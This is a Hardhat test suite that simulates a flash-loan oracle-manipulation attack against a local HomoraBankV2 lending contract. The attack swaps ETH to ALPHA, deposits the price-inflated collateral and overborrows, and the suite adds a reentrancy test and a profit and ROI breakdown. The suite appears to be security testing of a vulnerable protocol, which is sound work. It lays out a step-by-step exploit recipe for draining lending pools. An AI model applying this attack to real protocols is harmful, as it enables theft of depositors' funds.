const { expect } = require('chai');
const { ethers } = require('hardhat');

/**
 * Realistic Flash Loan Attack Test Suite
 * Tests: ETH flash loan → swap to ALPHA → exploit inflated collateral
 */
describe('Realistic Flash Loan Attack - ETH to ALPHA', function () {
    let alphaToken, pair, router, oracle, bank, attacker;
    let owner, user;
    
    const INITIAL_LIQUIDITY_ALPHA = ethers.parseEther('10000000'); // 10M ALPHA
    const INITIAL_LIQUIDITY_ETH = ethers.parseEther('1000'); // 1000 ETH
    const FLASH_LOAN_ETH = ethers.parseEther('2000'); // 2000 ETH flash loan
    
    beforeEach(async function () {
        [owner, user] = await ethers.getSigners();
        
        console.log('\n=== SETTING UP TEST ENVIRONMENT ===\n');
        
        // Deploy contracts (same as before)
        const AlphaToken = await ethers.getContractFactory('AlphaToken');
        alphaToken = await AlphaToken.deploy();
        console.log('✅ AlphaToken deployed');
        
        // Setup Uniswap (using mainnet fork)
        const UniswapV2Router = await ethers.getContractAt(
            'IUniswapV2Router02',
            '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D'
        );
        router = UniswapV2Router;
        
        const UniswapV2Factory = await ethers.getContractAt(
            'IUniswapV2Factory',
            '0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f'
        );
        
        // Create pair and add liquidity
        await alphaToken.approve(await router.getAddress(), INITIAL_LIQUIDITY_ALPHA);
        await router.addLiquidityETH(
            await alphaToken.getAddress(),
            INITIAL_LIQUIDITY_ALPHA,
            0,
            0,
            owner.address,
            Math.floor(Date.now() / 1000) + 300,
            { value: INITIAL_LIQUIDITY_ETH }
        );
        
        const pairAddress = await UniswapV2Factory.getPair(
            await alphaToken.getAddress(),
            await router.WETH()
        );
        pair = await ethers.getContractAt('IUniswapV2Pair', pairAddress);
        console.log('✅ Uniswap pair created and funded');
        
        // Deploy oracle and bank
        const ProxyOracle = await ethers.getContractFactory('ProxyOracle');
        oracle = await ProxyOracle.deploy(pairAddress);
        console.log('✅ ProxyOracle deployed');
        
        const HomoraBankV2 = await ethers.getContractFactory('HomoraBankV2');
        bank = await HomoraBankV2.deploy(
            await alphaToken.getAddress(),
            await oracle.getAddress(),
            false
        );
        console.log('✅ HomoraBankV2 deployed');
        
        // Fund bank
        await owner.sendTransaction({
            to: await bank.getAddress(),
            value: ethers.parseEther('500')
        });
        console.log('✅ Bank funded with 500 ETH');
        
        // Deploy realistic attacker
        const RealisticFlashLoanAttacker = await ethers.getContractFactory('RealisticFlashLoanAttacker');
        attacker = await RealisticFlashLoanAttacker.deploy(
            await bank.getAddress(),
            await oracle.getAddress(),
            await alphaToken.getAddress(),
            pairAddress,
            await router.getAddress()
        );
        console.log('✅ RealisticFlashLoanAttacker deployed');
        
        // Fund attacker with ETH (simulating flash loan)
        await owner.sendTransaction({
            to: await attacker.getAddress(),
            value: FLASH_LOAN_ETH
        });
        console.log('✅ Attacker funded with 2000 ETH (flash loan simulation)');
        
        console.log('\n=== SETUP COMPLETE ===\n');
    });
    
    describe('Realistic Attack: ETH Flash Loan → ALPHA Swap → Inflated Collateral', function () {
        it('Should demonstrate realistic flash loan attack with ETH', async function () {
            console.log('\n=== REALISTIC FLASH LOAN ATTACK TEST ===\n');
            console.log('Attack Scenario:');
            console.log('1. Take 2000 ETH flash loan');
            console.log('2. Swap ETH → ALPHA (price increases)');
            console.log('3. Deposit ALPHA as collateral at inflated price');
            console.log('4. Borrow maximum ETH');
            console.log('5. Swap ALPHA back to ETH');
            console.log('6. Repay flash loan');
            console.log('7. Keep profit\n');
            
            // Step 1: Record initial state
            const priceBeforeAttack = await oracle.getPriceUnsafe(await alphaToken.getAddress());
            const bankBalanceBefore = await ethers.provider.getBalance(await bank.getAddress());
            
            console.log('Initial State:');
            console.log('- ALPHA Price:', ethers.formatEther(priceBeforeAttack), 'ALPHA per ETH');
            console.log('- Bank Balance:', ethers.formatEther(bankBalanceBefore), 'ETH');
            console.log('- Flash Loan Amount: 2000 ETH\n');
            
            // Step 2: Simulate attack
            const simulation = await attacker.simulateRealisticAttack(FLASH_LOAN_ETH);
            
            console.log('Attack Simulation:');
            console.log('- Price before:', ethers.formatEther(simulation[0]), 'ALPHA per ETH');
            console.log('- Price after swap:', ethers.formatEther(simulation[1]), 'ALPHA per ETH');
            console.log('- Price INCREASE:', simulation[2].toString() + '%');
            console.log('- ALPHA received:', ethers.formatEther(simulation[3]));
            console.log('- Max borrow (inflated):', ethers.formatEther(simulation[4]), 'ETH');
            console.log('- Max borrow (real):', ethers.formatEther(simulation[5]), 'ETH');
            console.log('- Overborrow amount:', ethers.formatEther(simulation[4] - simulation[5]), 'ETH');
            console.log('- Estimated profit:', ethers.formatEther(simulation[6]), 'ETH');
            console.log('- Will succeed:', simulation[7], '\n');
            
            // Step 3: Execute attack
            console.log('Executing attack...\n');
            
            try {
                await attacker.executeRealisticAttack(FLASH_LOAN_ETH, { value: ethers.parseEther('1') });
                
                // Step 4: Check results
                const attackStats = await attacker.getAttackStats();
                const attackSuccessful = await attacker.wasAttackSuccessful();
                const profit = await attacker.calculateProfit();
                
                const priceAfterAttack = await oracle.getPriceUnsafe(await alphaToken.getAddress());
                const bankBalanceAfter = await ethers.provider.getBalance(await bank.getAddress());
                
                console.log('Attack Results:');
                console.log('- Flash loan used:', ethers.formatEther(attackStats[0]), 'ETH');
                console.log('- ALPHA received:', ethers.formatEther(attackStats[1]));
                console.log('- Collateral deposited:', ethers.formatEther(attackStats[2]));
                console.log('- ETH borrowed:', ethers.formatEther(attackStats[3]), 'ETH');
                console.log('- Final ALPHA price:', ethers.formatEther(priceAfterAttack), 'ALPHA per ETH');
                console.log('- Bank balance change:', ethers.formatEther(bankBalanceBefore - bankBalanceAfter), 'ETH');
                console.log('- Attack successful:', attackSuccessful);
                console.log('- Attacker profit:', ethers.formatEther(profit), 'ETH\n');
                
                if (attackSuccessful && profit > 0) {
                    console.log('🚨 VULNERABILITY CONFIRMED!');
                    console.log('Attacker successfully exploited inflated collateral value!');
                    console.log('Protocol Loss:', ethers.formatEther(profit), 'ETH\n');
                    
                    // Calculate exploitation details
                    const realValue = (attackStats[2] * ethers.parseEther('1')) / simulation[0];
                    const inflatedValue = (attackStats[2] * ethers.parseEther('1')) / simulation[1];
                    const valueInflation = ((inflatedValue - realValue) * 100n) / realValue;
                    
                    console.log('Exploitation Details:');
                    console.log('- Real collateral value:', ethers.formatEther(realValue), 'ETH');
                    console.log('- Inflated collateral value:', ethers.formatEther(inflatedValue), 'ETH');
                    console.log('- Value inflation:', valueInflation.toString() + '%');
                    console.log('- Overborrowed:', ethers.formatEther(profit), 'ETH');
                } else {
                    console.log('✅ ATTACK PREVENTED!');
                    console.log('Oracle deviation limits or other protections working.\n');
                }
                
            } catch (error) {
                console.log('✅ ATTACK PREVENTED!');
                console.log('Transaction reverted:', error.message, '\n');
                
                if (error.message.includes('Price deviation too high')) {
                    console.log('Reason: Oracle deviation limit triggered');
                    console.log('The 50% deviation limit prevented price manipulation\n');
                } else {
                    console.log('Reason:', error.message, '\n');
                }
            }
            
            console.log('=== TEST COMPLETE ===\n');
        });
        
        it('Should test different flash loan amounts', async function () {
            console.log('\n=== TESTING DIFFERENT FLASH LOAN AMOUNTS ===\n');
            
            const flashLoanAmounts = [
                ethers.parseEther('500'),   // 500 ETH
                ethers.parseEther('1000'),  // 1000 ETH
                ethers.parseEther('2000'),  // 2000 ETH
                ethers.parseEther('5000'),  // 5000 ETH
            ];
            
            for (const amount of flashLoanAmounts) {
                const simulation = await attacker.simulateRealisticAttack(amount);
                
                console.log(`Flash Loan: ${ethers.formatEther(amount)} ETH`);
                console.log(`- Price increase: ${simulation[2].toString()}%`);
                console.log(`- Estimated profit: ${ethers.formatEther(simulation[6])} ETH`);
                console.log(`- Will succeed: ${simulation[7]}`);
                console.log('');
            }
            
            console.log('=== ANALYSIS COMPLETE ===\n');
        });
    });
    
    describe('Reentrancy Attack Tests', function () {
        it('Should test reentrancy vulnerability', async function () {
            console.log('\n=== REENTRANCY ATTACK TEST ===\n');
            
            // Fund attacker with ALPHA
            await alphaToken.transfer(await attacker.getAddress(), ethers.parseEther('100000'));
            
            console.log('Testing reentrancy during borrow callback...\n');
            
            try {
                await attacker.executeReentrancyAttack(ethers.parseEther('10000'), { value: ethers.parseEther('1') });
                
                const attackSuccessful = await attacker.wasAttackSuccessful();
                
                if (attackSuccessful) {
                    console.log('🚨 REENTRANCY VULNERABILITY CONFIRMED!');
                    console.log('Attacker successfully called borrow() during callback!');
                    console.log('NonReentrant guard NOT working!\n');
                } else {
                    console.log('✅ REENTRANCY PREVENTED!');
                    console.log('NonReentrant guard working correctly.\n');
                }
                
            } catch (error) {
                console.log('✅ REENTRANCY PREVENTED!');
                console.log('Transaction reverted:', error.message, '\n');
            }
            
            console.log('=== REENTRANCY TEST COMPLETE ===\n');
        });
    });
    
    describe('Profitability Analysis', function () {
        it('Should calculate detailed profitability', async function () {
            console.log('\n=== PROFITABILITY ANALYSIS ===\n');
            
            const simulation = await attacker.simulateRealisticAttack(FLASH_LOAN_ETH);
            
            console.log('Attack Economics:');
            console.log('');
            
            // Costs
            const flashLoanFee = (FLASH_LOAN_ETH * 9n) / 10000n; // 0.09%
            const swapFee1 = (FLASH_LOAN_ETH * 3n) / 1000n; // 0.3% on ETH→ALPHA
            const swapFee2 = (simulation[3] * 3n) / 1000n; // 0.3% on ALPHA→ETH
            const gasCost = ethers.parseEther('0.5'); // Estimated
            
            const totalCosts = flashLoanFee + gasCost;
            
            console.log('Costs:');
            console.log('- Flash loan fee (0.09%):', ethers.formatEther(flashLoanFee), 'ETH');
            console.log('- Swap fees:', ethers.formatEther(swapFee1 + swapFee2), 'ETH (in value)');
            console.log('- Gas costs:', ethers.formatEther(gasCost), 'ETH');
            console.log('- Total costs:', ethers.formatEther(totalCosts), 'ETH\n');
            
            // Revenue
            const overborrow = simulation[4] - simulation[5];
            
            console.log('Revenue:');
            console.log('- Overborrowed amount:', ethers.formatEther(overborrow), 'ETH');
            console.log('- Estimated profit:', ethers.formatEther(simulation[6]), 'ETH\n');
            
            // Net profit
            const netProfit = simulation[6] - totalCosts;
            
            console.log('Net Profit:');
            console.log('- Gross profit:', ethers.formatEther(simulation[6]), 'ETH');
            console.log('- Total costs:', ethers.formatEther(totalCosts), 'ETH');
            console.log('- Net profit:', ethers.formatEther(netProfit), 'ETH\n');
            
            if (netProfit > 0) {
                const roi = (netProfit * 100n) / totalCosts;
                console.log('ROI:', roi.toString() + '%');
                console.log('');
                console.log('⚠️  ATTACK IS PROFITABLE!\n');
            } else {
                console.log('✅ Attack not profitable\n');
            }
            
            console.log('=== ANALYSIS COMPLETE ===\n');
        });
    });
});